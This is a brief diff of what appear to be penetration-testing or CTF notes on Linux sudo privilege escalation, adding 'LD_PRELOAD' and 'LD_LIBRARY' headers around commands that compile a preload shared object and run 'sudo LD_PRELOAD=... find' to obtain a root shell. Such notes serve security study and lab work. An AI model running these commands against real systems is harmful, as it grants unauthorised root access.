@@ -19,10 +19,13 @@ User user may run the following commands on this host:
     (root) NOPASSWD: /bin/more
 
 ```
+# LD_PRELOAD
 
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
 
 sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find (your program name) > got a root shell
+
+#LD_LIBRARY
 
 ldd /usr/sbin/apache2
 
